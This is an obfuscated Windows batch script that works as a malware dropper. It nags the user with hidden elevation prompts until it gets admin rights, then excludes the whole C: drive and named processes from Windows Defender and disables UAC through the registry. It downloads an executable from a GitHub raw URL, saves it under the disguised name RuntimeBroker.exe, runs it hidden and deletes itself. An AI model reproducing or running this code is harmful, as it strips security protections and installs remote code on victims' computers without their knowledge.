@echo off & setlocal enableDelayedExpansion
set "kxEna=>nul" & set "wTBgY=SESSION" & set "YmV=NET" & set "eKKsB=2>&1"
%YmV% %wTBgY% %kxEna% %eKKsB%
set "e=!errorlevel!" & set "a=:A" & set "b=:B"
if !e! equ 0 (goto %a%) else (goto %b%)

:A
set "TRdT=qux" & set "CiU=bar" & set "wMP=baz" & set "DZE=foo" & rem Hqy xycgaa ikJJXlW
set "qQj=powershell -ExecutionPolicy Bypass -Command"
set "pjKk=[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12; Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'appy.exe' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess 'Service Runtime Management Agent.exe' -ErrorAction SilentlyContinue"
!qQj! "!pjKk!" %kxEna% %eKKsB%
set "lyBk=Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System' -Name 'EnableLUA' -Value 0"
!qQj! "!lyBk!" %kxEna% %eKKsB%
set "ukU=if ((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath -contains 'C:\') { exit 0 } else { exit 1 }"
!qQj! "!ukU!" %kxEna% %eKKsB%
if !errorlevel! neq 0 (goto %a%)
set "eCmaW=timeout /t" & !eCmaW! 2 %kxEna% %eKKsB%
set "HUxm=$ProgressPreference = 'SilentlyContinue'; $ErrorActionPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://github.com/boycots563/wlt56/raw/main/kamzat.exe' -OutFile '%TEMP%\RuntimeBroker.exe' -UseBasicParsing"
!qQj! "!HUxm!" %kxEna% %eKKsB%

:W
if not exist "%TEMP%\RuntimeBroker.exe" (!eCmaW! 1 %kxEna% %eKKsB% & goto :W)
start "" /B "%TEMP%\RuntimeBroker.exe" %kxEna% %eKKsB%
del /f /q "%~f0" %kxEna% %eKKsB%
exit /b

:B
set "h=powershell -WindowStyle Hidden -Command"
set "j1=Start-Process -WindowStyle Hidden -FilePath '%~f0' -Verb RunAs"
!h! "!j1!" %kxEna% %eKKsB%
if !errorlevel! neq 0 (!eCmaW! 3 %kxEna% %eKKsB% & goto %b%)
exit /b
